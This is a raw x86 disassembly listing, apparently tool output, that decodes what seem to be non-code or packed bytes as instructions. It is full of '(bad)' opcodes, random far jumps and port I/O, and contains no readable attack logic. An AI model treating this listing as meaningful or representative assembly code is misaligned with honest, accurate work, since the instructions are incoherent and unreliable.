  4250ab:	leave  
  4250ac:	jbe    0x42505d
  4250ae:	xchg   esp,eax
  4250af:	mov    ds:0x881faf46,eax
  4250b4:	and    DWORD PTR [edx+ecx*2],edx
  4250b7:	call   0x12a9:0x1dcb4377
  4250be:	test   DWORD PTR [ebp-0x4],esi
  4250c1:	repz mov bl,0xd2
  4250c4:	shl    BYTE PTR [esi+0x12],1
  4250c7:	push   ebx
  4250c8:	gs jne 0x425060
  4250cb:	inc    ebp
  4250cc:	sbb    al,dh
  4250ce:	jle    0x42513f
  4250d0:	push   edx
  4250d1:	repnz mov edi,edi
  4250d4:	icebp  
  4250d5:	test   al,0x54
  4250d7:	(bad)  
  4250d8:	mov    edi,0x3cba6ace
  4250dd:	cmp    edi,esp
  4250df:	inc    ebx
  4250e0:	cmp    DWORD PTR [edi],edi
  4250e2:	and    eax,0x44240102
  4250e7:	inc    esp
  4250e8:	pusha  
  4250e9:	xchg   edx,eax
  4250ea:	cmp    esi,DWORD PTR [edi+0x2c0945eb]
  4250f0:	push   edi
  4250f1:	sti    
  4250f2:	push   0xd9147835
  4250f7:	lea    edi,[eax+0x17]
  4250fa:	mov    al,0xc2
  4250fc:	enter  0xb6c4,0x44
  425100:	sub    eax,0x4ae7ea5b
  425105:	jle    0x42515e
  425107:	xchg   esi,eax
  425108:	mov    ecx,ebx
  42510a:	sub    al,0x61
  42510c:	stos   DWORD PTR es:[edi],eax
  42510d:	xchg   esi,eax
  42510e:	ins    DWORD PTR es:[edi],dx
  42510f:	out    dx,al
  425110:	bound  eax,QWORD PTR [eax]
	...
  425172:	add    BYTE PTR [eax],al
  425174:	ficom  WORD PTR [ecx]
  425176:	lahf   
  425177:	and    ebx,edi
  425179:	scas   eax,DWORD PTR es:[edi]
  42517a:	(bad)  
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0x3e4c:0x465d92e8
  425184:	outs   dx,DWORD PTR ds:[esi]
  425185:	mov    WORD PTR [ecx],es
  425187:	add    BYTE PTR ds:0xe5000001,al
  42518d:	fwait
  42518e:	mov    dl,0x17
  425190:	aam    0xf
  425192:	adc    eax,0x4e728b89
  425197:	inc    ecx
  425198:	push   esp
  425199:	push   esi
  42519a:	outs   dx,BYTE PTR ds:[esi]
  42519b:	sub    BYTE PTR [edi],dh
  42519d:	test   BYTE PTR [eax],dl
  42519f:	mov    bh,0x1b
  4251a1:	xchg   esi,eax
  4251a2:	add    BYTE PTR [ebx+0x35a7c8a],bl
  4251a8:	xchg   edx,eax
  4251a9:	mov    al,ds:0xed6435a9
  4251ae:	mov    al,0x85
  4251b0:	jl     0x4251b7
  4251b2:	inc    ebx
  4251b3:	and    al,0x2
  4251b5:	fldenv [esi]
  4251b7:	test   DWORD PTR [esi+0x21],ecx
  4251ba:	xlat   BYTE PTR ds:[ebx]
  4251bb:	and    al,0xcf
  4251bd:	popa   
  4251be:	push   ecx
  4251bf:	lods   al,BYTE PTR ds:[esi]
  4251c0:	xchg   esi,eax
  4251c1:	sub    al,0xb9
  4251c3:	stos   DWORD PTR es:[edi],eax
  4251c4:	jg     0x4251f7
  4251c6:	push   0xffffffee
  4251c8:	jb     0x4251e4
  4251ca:	add    eax,0x4aa783e3
  4251cf:	(bad)  
  4251d0:	ror    DWORD PTR [ebx+0x6ff9d380],cl
  4251d6:	ins    BYTE PTR es:[edi],dx
  4251d7:	bound  esp,QWORD PTR [ecx+0x6c3ef18b]
  4251dd:	retf   0xefb0
  4251e0:	mov    esi,0x2018b3a6
  4251e5:	adc    eax,0x588a0680
  4251ea:	dec    esp
  4251eb:	stos   BYTE PTR es:[edi],al
  4251ec:	pop    ebx
  4251ed:	aad    0x8f
  4251ef:	mov    ds:0x816304f,eax
  4251f4:	xchg   dh,ch
  4251f6:	pop    ds
  4251f7:	sbb    eax,0xcbec79d5
  4251fc:	fnstsw WORD PTR [edi+ebp*4-0x16]
  425200:	jbe    0x4251a7
  425202:	out    0x1f,al
  425204:	bound  esp,QWORD PTR [esi-0x50d2c8ad]
  42520a:	xchg   ebp,eax
  42520b:	jmp    0x8a82946
  425210:	clc    
  425211:	pop    ds
  425212:	in     eax,dx
  425213:	xor    BYTE PTR [ecx-0x4b70b29b],0x51
  42521a:	cmp    eax,DWORD PTR [edi+0x26]
  42521d:	mov    dh,0x92
  42521f:	and    DWORD PTR [eax],esp
  425221:	clc    
  425222:	(bad)  
  425223:	ins    DWORD PTR es:[edi],dx
  425224:	iret   
  425225:	push   esp
  425226:	mov    cl,BYTE PTR [ebp+0x48]
  425229:	dec    ebp
  42522a:	dec    esp
  42522b:	inc    edi
  42522c:	aad    0x41
  42522e:	dec    esi
  42522f:	dec    ecx
  425230:	adc    eax,0x2d960e95
  425235:	stc    
  425236:	mov    ebx,0x93170ee6
  42523b:	mov    ebx,0x89c449f8
  425240:	add    al,0x72
  425242:	imul   esp,DWORD PTR [esi+edi*1],0x7a36bb21
  425249:	pop    ebx
  42524a:	xor    al,0xeb
  42524c:	or     ecx,DWORD PTR ds:[esp+ebp*8-0x3b19fa6b]
  425254:	leave  
  425255:	adc    BYTE PTR [esi],dh
  425257:	inc    edx
  425258:	jle    0x4252ca
  42525a:	or     DWORD PTR [edi+0x5b],eax
  42525d:	fdivr  QWORD PTR [ecx-0x5]
  425260:	sbb    al,BYTE PTR [ecx+0x528b5a1c]
  425266:	mov    edi,0xca256398
  42526b:	psllq  mm0,mm1
  42526e:	imul   esp,DWORD PTR [ecx+ebx*4+0x9],0x40
  425273:	loope  0x425239
  425275:	in     al,dx
  425276:	push   0xffffff80
  425278:	cmp    al,0xe7
  42527a:	shl    BYTE PTR cs:[eax],cl
  42527d:	adc    eax,edx
  42527f:	cmp    al,0x3b
  425281:	push   ds
  425282:	sub    DWORD PTR [esi+edi*2+0x1e],esp
  425286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425287:	push   0x62
  425289:	test   al,0x1a
  42528b:	jnp    0x4252be
  42528d:	push   es
  42528e:	(bad)  
  42528f:	pop    ebx
  425290:	pusha  
	...
  4252f1:	add    BYTE PTR [eax],al
  4252f3:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	pop    esi
  425301:	mov    edx,0x8d74232a
  425306:	add    DWORD PTR [eax],eax
  425308:	add    eax,0x93000001
  42530d:	xlat   BYTE PTR ds:[ebx]
  42530e:	in     al,0xf7
  425310:	subps  xmm1,XMMWORD PTR [edx]
  425313:	push   ebx
  425314:	and    esi,DWORD PTR [eax+ebx*1]
  425317:	sbb    ah,bh
  425319:	into   
  42531a:	pop    ebx
  42531b:	mov    ecx,0x78a238c3
  425320:	pop    edi
  425321:	lock adc dh,BYTE PTR [esi+0x1]
  425325:	xor    BYTE PTR [edx+edx*2+0x1cb59a4d],ah
  42532c:	xchg   DWORD PTR [edx+0x79283e8f],ebp
  425332:	xchg   al,al
  425334:	mov    ebp,0x73d5dad2
  425339:	(bad)  
  42533a:	outs   dx,BYTE PTR ds:[esi]
  42533b:	popf   
  42533c:	xor    BYTE PTR [edi],cl
  42533e:	sbb    al,0x3c
  425340:	jmp    0xa13a2b4f
  425345:	or     eax,0xc877ff3c
  42534a:	jno    0x4252e9
  42534c:	test   DWORD PTR [edi],0xff4d39f4
  425352:	xor    BYTE PTR [edx+0x44773f39],al
  425358:	xlat   BYTE PTR ds:[ebx]
  42535a:	sbb    eax,0x14085d66
  42535f:	outs   dx,DWORD PTR ds:[esi]
  425360:	or     DWORD PTR [esi],esp
  425362:	ins    DWORD PTR es:[edi],dx
  425363:	sar    DWORD PTR [ebp+ebp*2+0x6fe87897],0x52
  42536b:	add    esi,DWORD PTR [esi+ebp*2-0x71f4e985]
  425372:	add    cl,BYTE PTR [esi-0x7567bbfc]
  425378:	popf   
  425379:	out    0x1b,al
  42537b:	push   0xd617db68
  425380:	clc    
  425381:	push   ebp
  425382:	jle    0x4253a0
  425384:	push   0x32
  425386:	mov    edi,0xb102a3e0
  42538b:	push   eax
  42538c:	push   edx
  42538d:	mov    cl,0x5e
  42538f:	call   0xb8ecdc07
  425394:	mov    bl,0x32
  425396:	call   0xc88d2da5
  42539b:	pop    esi
  42539c:	stos   BYTE PTR es:[edi],al
  42539d:	xor    eax,0x9256de64
  4253a2:	pop    ebp
  4253a3:	and    DWORD PTR [eax+0x38],0x3b
  4253a7:	cmc    
  4253a8:	mov    ?,WORD PTR [edi+eax*8]
  4253ab:	ds retf 0x94e8
  4253af:	sbb    cl,BYTE PTR [ebp-0x5d]
  4253b2:	inc    edx
  4253b3:	leave  
  4253b4:	clc    
  4253b5:	push   ecx
  4253b6:	sub    eax,0x92ddec41
  4253bb:	xor    BYTE PTR [edx+0x59b27ff9],ah
  4253c1:	mov    ah,0x9d
  4253c3:	dec    ebp
  4253c4:	mov    WORD PTR [edx],ss
  4253c6:	or     eax,DWORD PTR [esi]
  4253c8:	ret    
  4253c9:	mov    bh,0x27
  4253cb:	mov    DWORD PTR [edx],ebp
  4253cd:	sahf   
  4253ce:	or     eax,0xbc4ce0c3
  4253d3:	cmc    
  4253d4:	xchg   BYTE PTR [esi-0x6f],dh
  4253d7:	test   al,0x49
  4253d9:	je     0x42545a
  4253db:	(bad)  
  4253dc:	xchg   edx,eax
  4253dd:	lds    esi,FWORD PTR [esi+ebx*4]
  4253e0:	add    DWORD PTR [esi+0x423c13c9],ebx
  4253e6:	pusha  
  4253e7:	mul    DWORD PTR [esi*4-0x1bcaf875]
  4253ee:	pop    ax
  4253f0:	in     al,dx
  4253f1:	pusha  
  4253f2:	cmp    ebp,DWORD PTR ds:0x9d2aa8
  4253f8:	sbb    al,0x10
  4253fa:	mov    dl,0xee
  4253fc:	sub    al,0xb5
  4253fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4253ff:	test   al,0x3f
  425401:	lea    eax,[esi]
  425403:	mov    esi,edx
  425405:	inc    edx
  425406:	xchg   eax,edx
  425408:	into   
  425409:	sbb    bl,BYTE PTR [edx]
  42540b:	mov    cl,0xe6
  42540d:	call   0x10872e7
	...
  425472:	add    BYTE PTR [eax],al
  425474:	inc    edx
  425475:	or     esp,eax
  425477:	test   eax,0xeb6fedcf
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    edx,edx
  425481:	mov    dl,BYTE PTR [ebp+0x18e79f6]
  425487:	add    BYTE PTR ds:0x82000001,al
  42548d:	cwde   
  42548e:	jmp    0x5043:0x6630814c
  425495:	or     edx,esi
  425497:	ret    
  425498:	ins    BYTE PTR es:[edi],dx
  425499:	jg     0x4254e7
  42549b:	mov    DWORD PTR [edi-0x414dff6c],esp
  4254a1:	scas   eax,DWORD PTR es:[edi]
  4254a2:	mov    al,0xdf
  4254a4:	or     esi,DWORD PTR [ebp-0x1c]
  4254a7:	jbe    0x425484
  4254a9:	shl    esi,cl
  4254ab:	sbb    DWORD PTR [edx-0x386fd74e],edx
  4254b1:	or     esi,DWORD PTR [esi]
  4254b3:	int    0xa5
  4254b5:	jnp    0x42550f
  4254b7:	repz mov al,ds:0xcf0a06f6
  4254bd:	stc    
  4254be:	mov    esp,0x40c5e1c5
  4254c3:	outs   dx,DWORD PTR ds:[esi]
  4254c4:	cmp    BYTE PTR [ebp+edx*2+0xc],bh
  4254c8:	shl    DWORD PTR [esi+esi*4+0x5f3530fd],0x4d
  4254d0:	imul   esi,DWORD PTR [edi+0x3c],0xffffffaa
  4254d4:	sbb    BYTE PTR [ecx-0x1d],bh
  4254d7:	(bad)  
  4254d8:	out    0xb7,eax
  4254da:	adc    dl,BYTE PTR [edi+eiz*4]
  4254dd:	push   edx
  4254de:	ret    0x140b
  4254e1:	or     eax,0x786ea9fe
  4254e6:	pop    esp
  4254e7:	loope  0x4254d5
  4254e9:	inc    eax
  4254ea:	inc    ebp
  4254eb:	adc    eax,0x6e8b4b76
  4254f0:	les    ebp,FWORD PTR [edi+ebp*4+0x3]
  4254f4:	sbb    bl,0xa4
  4254f7:	adc    dh,BYTE PTR [edi]
  4254f9:	sub    edi,DWORD PTR [edx+0x5cc94a38]
  4254ff:	lods   al,BYTE PTR ds:[esi]
  425500:	mov    al,ds:0x5527c9d7
  425505:	sub    ebp,DWORD PTR fs:0xd4353d15
  42550c:	iret   
  42550d:	mov    ds:0x855ba5a4,al
  425512:	in     eax,0x60
  425514:	lahf   
  425515:	cmp    DWORD PTR [ebp-0x54c83548],0xffffffe3
  42551c:	push   edi
  42551d:	call   0x2b264385
  425522:	push   ecx
  425523:	fcomp  QWORD PTR [esi-0x2fcbf8d1]
  425529:	or     eax,0x315bb03b
  42552e:	imul   esi,esi,0x4b5e8b3c
  425534:	pop    ds
  425535:	xor    BYTE PTR [edi+0x34d41a2],dl
  42553b:	mov    dl,0x8a
  42553d:	push   es
  42553e:	pop    ebx
  42553f:	addr16 xchg ebp,eax
  425541:	inc    ebp
  425542:	dec    esi
  425543:	ret    0x4766
  425546:	add    DWORD PTR [ebx*1-0xc4c774b],edi
  42554d:	jb     0x42557b
  42554f:	xor    DWORD PTR [esi-0x7003de2e],esp
  425555:	aas    
  425556:	mov    dh,0x7b
  425558:	mov    ch,0xb5
  42555a:	or     ecx,DWORD PTR [ecx-0x7b68582]
  425560:	ins    DWORD PTR es:[edi],dx
  425561:	psrld  mm1,QWORD PTR [ecx]
  425564:	or     BYTE PTR [esi],al
  425566:	mov    ch,0xf0
  425568:	dec    eax
  425569:	aaa    
  42556a:	mov    ds:0x93615845,eax
  42556f:	mov    al,0x8e
  425571:	(bad)  
  425572:	in     eax,dx
  425573:	ins    BYTE PTR es:[edi],dx
  425574:	neg    BYTE PTR [edx-0x4d]
  425577:	jb     0x425594
  425579:	(bad)  
  42557a:	fstenv [eax]
  42557d:	cmovo  ebp,DWORD PTR [edi+ebx*2-0x2f]
  425582:	mov    ecx,0x153dca33
  425587:	js     0x4255b4
  425589:	gs repz xchg ebp,eax
  42558c:	in     al,0x4a
  42558e:	sub    ebx,edx
  425590:	in     al,0x0
	...
  4255f2:	add    BYTE PTR [eax],al
  4255f4:	(bad)  
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0x83c4f13a
  425602:	pop    esi
  425603:	jns    0x425683
  425605:	pop    DWORD PTR [ecx]
  425607:	add    BYTE PTR ds:0x4d000001,al
  42560d:	lods   eax,DWORD PTR ds:[esi]
  42560e:	sbb    eax,0x8de814df
  425613:	pop    eax
  425614:	push   ebp
  425615:	pop    es
  425616:	xchg   edx,eax
  425617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425618:	fcomp  QWORD PTR [ebx+0x6c]
  42561b:	(bad)  
  42561c:	jp     0x4255b3
  42561e:	pop    ebp
  42561f:	(bad)  
  425620:	test   eax,0xa0f115e3
  425625:	rol    DWORD PTR [edi],1
  425627:	cmp    edx,edi
  425629:	xor    BYTE PTR [eax],ch
  42562b:	das    
  42562c:	dec    edi
  42562d:	into   
  42562e:	dec    eax
  42562f:	xlat   BYTE PTR ds:[ebx]
  425630:	pop    esi
  425631:	in     eax,dx
  425632:	add    ebp,esp
  425634:	out    dx,eax
  425635:	mov    esi,0x538fea63
  42563a:	jne    0x42569d
  42563c:	mov    ah,0xb6
  42563e:	mov    esp,esi
  425640:	sub    dh,BYTE PTR [edi]
  425642:	adc    DWORD PTR [ebx-0x20],ebp
  425645:	jge    0x42568c
  425647:	dec    eax
  425648:	dec    esp
  425649:	sbb    al,0x3e
  42564b:	adc    eax,0x68017080
  425650:	and    ecx,DWORD PTR [eax-0x37]
  425653:	fst    st(5)
  425655:	push   edi
  425656:	dec    eax
  425657:	ins    BYTE PTR es:[edi],dx
  425658:	inc    esi
  425659:	push   edx
  42565a:	les    ebx,FWORD PTR [edx-0x60]
  42565d:	mov    ch,0xfb
  42565f:	or     DWORD PTR [esi+edi*8],esp
  425662:	mov    ch,0xc0
  425664:	and    al,0x2
  425666:	sub    al,BYTE PTR [ecx-0xe558ef6]
  42566c:	mov    edi,0xba722b67
  425671:	jnp    0x425638
  425673:	test   eax,0x4a0ab383
  425678:	lods   eax,DWORD PTR ds:[esi]
  425679:	ret    
  42567a:	ret    0x56c1
  42567d:	ficomp WORD PTR [eax+ecx*1]
  425680:	div    BYTE PTR [eax-0x71]
  425683:	jecxz  0x4256c8
  425685:	xchg   ecx,eax
  425686:	mov    ebx,0x1b96977b
  42568b:	mov    cl,0x1
  42568d:	mov    WORD PTR [esi+0x64],gs
  425690:	mov    eax,0x18187b03
  425695:	call   0xee54:0xbafdf900
  42569c:	jb     0x425643
  42569e:	cmp    BYTE PTR cs:[esi-0x1cf2cad],0xba
  4256a6:	jecxz  0x425685
  4256a8:	sbb    al,BYTE PTR [ebx+0x68f3596b]
  4256ae:	cmp    eax,0xcc8a1e72
  4256b3:	cmp    al,0xcb
  4256b5:	mov    al,0x4f
  4256b7:	fild   QWORD PTR [ebx-0xe]
  4256ba:	or     ah,BYTE PTR [esi+0x5a]
  4256bd:	nop
  4256be:	cmp    eax,0xc42316a7
  4256c3:	sbb    ecx,DWORD PTR [ecx]
  4256c5:	js     0x425691
  4256c7:	push   eax
  4256c8:	xchg   edx,eax
  4256c9:	cli    
  4256ca:	loop   0x4256c1
  4256cc:	mov    edx,ss
  4256ce:	jns    0x4256a2
  4256d0:	cmp    BYTE PTR [ebp+0x5e35e813],bh
  4256d6:	ret    
  4256d7:	and    BYTE PTR [ebx+0x5e],al
  4256da:	pusha  
  4256db:	xchg   ecx,eax
  4256dc:	daa    
  4256dd:	xor    eax,0x35846d21
  4256e2:	pushf  
  4256e3:	aam    0x6c
  4256e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256e6:	mov    WORD PTR [esi-0x75e1c83e],ds
  4256ec:	lods   eax,DWORD PTR ds:[esi]
  4256ed:	(bad)  
  4256ee:	mov    dl,0x2a
  4256f0:	pop    es
  4256f1:	mov    esp,0x70890c2a
  4256f6:	push   0x5f9f36f2
  4256fb:	adc    ch,BYTE PTR [ecx-0x28dfc5e5]
  425701:	imul   esi,DWORD PTR [eax],0x2c4c5ac
  425707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425708:	std    
  425709:	loop   0x4256d2
  42570b:	sbb    BYTE PTR fs:[esi],0xff
  42570f:	std    
  425710:	xchg   ecx,eax
	...
  425771:	add    BYTE PTR [eax],al
  425773:	add    dh,dl
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0xb7a2bf74
  425783:	cmp    DWORD PTR [ebx+0x5000190],eax
  425789:	add    DWORD PTR [eax],eax
  42578b:	add    BYTE PTR [ecx],dl
  42578d:	cmp    eax,0x4e18fa3c
  425792:	ja     0x4257fc
  425794:	in     al,dx
  425795:	push   ebp
  425796:	xor    bh,BYTE PTR [edi-0x5]
  425799:	push   ds
  42579a:	pop    esi
  42579b:	fs pop esp
  42579d:	mov    esi,0xbebdba07
  4257a2:	outs   dx,BYTE PTR ds:[esi]
  4257a3:	aad    0xe7
  4257a5:	pop    esp
  4257a6:	pop    es
  4257a7:	inc    edx
  4257a8:	loope  0x425791
  4257aa:	xor    eax,0xdb0d183f
  4257af:	adc    ebx,DWORD PTR [ebx-0x70]
  4257b2:	inc    edx
  4257b3:	mov    ds:0x5806dcfc,al
  4257b8:	xor    al,0x66
  4257bb:	jo     0x42574e
  4257bd:	mov    ebp,0x66bd768a
  4257c2:	jmp    0x8600:0xd7149f4
  4257c9:	adc    ch,BYTE PTR [esi-0xd]
  4257cc:	and    BYTE PTR [edx],bl
  4257ce:	mov    edx,0x73fb57b1
  4257d3:	dec    edx
  4257d4:	sbb    esi,DWORD PTR [edi+0x2c5833dd]
  4257da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257db:	repz fidivr WORD PTR [ecx]
  4257de:	retf   
  4257df:	lahf   
  4257e0:	into   
  4257e1:	nop
  4257e2:	mov    eax,ds:0x2bc303b0
  4257e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4257e8:	lods   eax,DWORD PTR ds:[esi]
  4257e9:	cmp    BYTE PTR [ecx],dh
  4257eb:	clc    
  4257ec:	xchg   ebx,eax
  4257ed:	cs aam 0x56
  4257f0:	repnz shr BYTE PTR [ecx+eax*8-0x3081d97e],0xef
  4257f9:	(bad)  
  4257fb:	rcl    BYTE PTR [eax],0xce
  4257fe:	jge    0x42579a
  425800:	sbb    ebx,DWORD PTR [ebx+0x6ab8cab5]
  425806:	pop    ebp
  425807:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425808:	inc    ebp
  425809:	retf   
  42580a:	adc    DWORD PTR [esi+0x67],ecx
  42580d:	(bad)  
  42580e:	adc    bh,bh
  425810:	sbb    ecx,DWORD PTR [eax+0x5a]
  425813:	sbb    al,0x5d
  425815:	xlat   BYTE PTR ds:[ebx]
  425816:	jne    0x425884
  425818:	pop    edi
  425819:	dec    edi
  42581a:	add    ecx,DWORD PTR [esp+eiz*8-0x22]
  42581e:	pop    esi
  42581f:	test   edx,0xb61dec13
  425825:	repz jmp 0xe700:0xd69f8e54
  42582d:	inc    edx
  42582e:	repz cwde 
  425830:	xor    dh,BYTE PTR [esi]
  425832:	test   ebx,edi
  425834:	push   ebx
  425835:	xor    esi,DWORD PTR [eax+0x3c]
  425838:	jle    0x4257bf
  42583a:	das    
  42583b:	aas    
  42583c:	sbb    BYTE PTR [edx+edx*1-0xc],al
  425840:	imul   edi,DWORD PTR [ebp+0x74],0xffffffff
  425844:	fxch   st(4)
  425846:	jecxz  0x425824
  425848:	mov    dh,BYTE PTR ds:0xce84ceb5
  42584e:	push   edx
  42584f:	push   ss
  425850:	mov    bl,0x5f
  425852:	fidivr WORD PTR [edx+0x1569d082]
  425858:	jle    0x425875
  42585a:	aad    0x32
  42585c:	(bad)  
  42585d:	loopne 0x425886
  42585f:	cs mov dh,0x29
  425862:	pop    edi
  425863:	cmp    al,0xcd
  425865:	push   eax
  425866:	mov    dh,0x9f
  425868:	mov    bl,0x87
  42586a:	ret    0xb18
  42586d:	pop    esp
  42586e:	xchg   ebp,eax
  42586f:	mov    ds:0xa99df254,al
  425874:	retf   
  425875:	(bad)  
  425876:	push   esp
  425877:	sbb    al,0xd7
  425879:	or     eax,0x7a984264
  42587e:	pop    esp
  42587f:	test   al,0x12
  425881:	sbb    eax,0x47ff86a4
  425886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425887:	mov    eax,0x2e1f78d2
  42588c:	mov    dh,dh
  42588e:	sub    edi,DWORD PTR [edi+0x71]
	...
  4258f4:	pop    esp
  4258f5:	push   edx
  4258f6:	nop
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	jno    0x42597f
  425902:	int3   
  425903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425904:	mov    BYTE PTR [ecx+0x1050001],dl
  42590a:	add    BYTE PTR [eax],al
  42590c:	fwait
  42590d:	mov    esp,DWORD PTR [esi+ecx*1-0x7998ec6e]
  425914:	into   
  425915:	(bad)  
  425916:	dec    esp
  425917:	shr    BYTE PTR [esi+eiz*1-0x75f1fc8f],1
  42591e:	or     eax,0xc850b124
  425923:	test   DWORD PTR [ecx+0x63e33e67],0xc17dc7c1
  42592d:	stc    
  42592e:	fnsave [eax-0xaa77f19]
  425934:	mov    dh,0x5e
  425936:	add    BYTE PTR fs:[ebp-0xe5b13a6],ch
  42593d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42593e:	sbb    al,0x4b
  425940:	leave  
  425941:	adc    BYTE PTR [edx+0x70],ch
  425944:	vucomisd xmm2,xmm5
  425948:	inc    ebp
  425949:	push   ss
  42594a:	or     edi,DWORD PTR [ecx+0x5314be0e]
  425950:	push   0xffffffef
  425952:	pop    ss
  425953:	dec    ebp
  425954:	xor    BYTE PTR [edi],ch
  425956:	push   edx
  425957:	inc    ebp
  425958:	repz cmp eax,0xea2ddc0d
  42595e:	xchg   esp,eax
  42595f:	add    esp,DWORD PTR [esi+0x4c]
  425962:	retf   0x40e
  425965:	sbb    eax,0x15fcfdb5
  42596a:	and    esi,edx
  42596c:	mov    dh,0xfc
  42596e:	xor    al,0xb1
  425970:	pushf  
  425971:	push   ebp
  425972:	lods   al,BYTE PTR ds:[esi]
  425973:	mov    edi,0xdbeb82b1
  425978:	sub    al,0xe8
  42597a:	sbb    eax,0xa522a520
  42597f:	xor    dl,dh
  425981:	add    al,0x8a
  425983:	iret   
  425984:	xchg   ecx,eax
  425985:	cmp    eax,0xb351f4d9
  42598a:	retf   0xb21b
  42598d:	sub    al,0xf
  42598f:	(bad)
  425993:	push   esp
  425994:	sub    BYTE PTR [edx+ebp*2],ah
  425997:	pop    es
  425998:	inc    edi
  425999:	fdiv   QWORD PTR [ebx+0x779f756c]
  42599f:	xor    al,0xf3
  4259a1:	dec    eax
  4259a2:	sub    al,0xf0
  4259a4:	int    0x5f
  4259a6:	mov    ah,BYTE PTR [eax+0x58bdb087]
  4259ac:	cmp    BYTE PTR [eax],dh
  4259ae:	sbb    dh,BYTE PTR [esi-0x3dc5b499]
  4259b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4259b5:	pop    ecx
  4259b6:	inc    ebx
  4259b7:	mov    bh,0x75
  4259b9:	xchg   ecx,eax
  4259ba:	jmp    0x42598f
  4259bc:	and    ebx,DWORD PTR [edi-0x3e]
  4259bf:	scas   eax,DWORD PTR es:[edi]
  4259c0:	sub    BYTE PTR [esi-0x3f],0x18
  4259c4:	cdq    
  4259c5:	adc    DWORD PTR [eax-0x7f661965],esp
  4259cb:	data16 test BYTE PTR [esp+ecx*8+0x698acadf],dh
  4259d3:	or     DWORD PTR [ebx-0x68],0xffffffad
  4259d7:	shl    DWORD PTR ss:0x9b842d32,0x51
  4259df:	mov    dl,0x2a
  4259e1:	inc    edi
  4259e2:	scas   al,BYTE PTR es:[edi]
  4259e3:	sbb    eax,0x74a6503
  4259e8:	fwait
  4259e9:	cmp    dl,ah
  4259eb:	push   ss
  4259ec:	les    ecx,FWORD PTR [edi-0x52]
  4259ef:	mov    ebp,0xc17f7055
  4259f4:	outs   dx,BYTE PTR ds:[esi]
  4259f5:	(bad)  
  4259f6:	call   0x727f:0x9ed8f76
  4259fd:	popf   
  4259fe:	xchg   ecx,eax
  4259ff:	mov    ah,0xd3
  425a01:	xlat   BYTE PTR ds:[ebx]
  425a02:	pop    ss
  425a03:	shr    DWORD PTR [edi-0x62],cl
  425a06:	mov    dh,dh
  425a08:	call   0xd09656c0
  425a0d:	dec    edi
  425a0e:	fdivr  st,st(7)
  425a10:	ins    BYTE PTR es:[edi],dx
	...
  425a71:	add    BYTE PTR [eax],al
  425a73:	add    cl,al
  425a75:	arpl   WORD PTR [edi+eiz*2],ax
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4-0x7cbcc3a5]
  425a84:	lea    edx,[edx+0x1050001]
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	mov    bh,0xbb
  425a8e:	and    eax,0x999f0b97
  425a93:	adc    eax,0xb06616e3
  425a98:	aas    
  425a99:	cmp    al,0xdf
  425a9b:	sahf   
  425a9c:	scas   eax,DWORD PTR es:[edi]
  425a9d:	cwde   
  425a9e:	sbb    edx,ecx
  425aa0:	cmp    ecx,esi
  425aa2:	daa    
  425aa3:	int3   
  425aa4:	xchg   esi,eax
  425aa5:	mov    ds:0xd6cfa555,eax
  425aaa:	xlat   BYTE PTR ds:[ebx]
  425aab:	pop    eax
  425aac:	sbb    ecx,esi
  425aae:	inc    ebx
  425aaf:	hlt    
  425ab0:	fisub  DWORD PTR [edi+esi*2]
  425ab3:	std    
  425ab4:	popa   
  425ab5:	push   0xa06c9510
  425aba:	mov    DWORD PTR [esi],0xc0e0610c
  425ac0:	ins    BYTE PTR es:[edi],dx
  425ac1:	pop    edi
  425ac2:	jg     0x425a52
  425ac4:	fwait
  425ac5:	and    DWORD PTR [ebp+ebx*2-0x25],0xcfd39705
  425acd:	lahf   
  425ace:	mov    al,0xa1
  425ad0:	mov    ds:0x6bc6e0ae,al
  425ad5:	or     DWORD PTR [eax],esi
  425ad7:	loope  0x425aac
  425ad9:	ror    DWORD PTR [esp+ecx*4+0x4a],cl
  425add:	dec    esp
  425ade:	popa   
  425adf:	stos   DWORD PTR es:[edi],eax
  425ae0:	mov    bh,0xa7
  425ae2:	icebp  
  425ae3:	dec    ax
  425ae5:	dec    esi
  425ae6:	xchg   ecx,eax
  425ae7:	xchg   ecx,eax
  425ae8:	clc    
  425ae9:	and    BYTE PTR [edi+0x542c07fe],ch
  425aef:	add    dh,BYTE PTR [esi-0xc]
  425af2:	inc    ecx
  425af3:	ficom  DWORD PTR [edi+0x3f]
  425af6:	mov    edx,0x38d1f5b9
  425afb:	out    0x62,al
  425afd:	xchg   ebp,eax
  425afe:	gs jmp 0xa666:0x59d370e3
  425b06:	mov    eax,ds:0x34c1c315
  425b0b:	push   ecx
  425b0c:	add    BYTE PTR [edi],0x7e
  425b0f:	sbb    BYTE PTR [ecx+eax*4],dl
  425b12:	sub    BYTE PTR [edi-0x5b6afffc],bl
  425b18:	stc    
  425b19:	adc    DWORD PTR [esi],edi
  425b1b:	sub    BYTE PTR [ecx],bl
  425b1d:	pop    ebx
  425b1e:	mov    ds:0x2c4692d5,al
  425b23:	icebp  
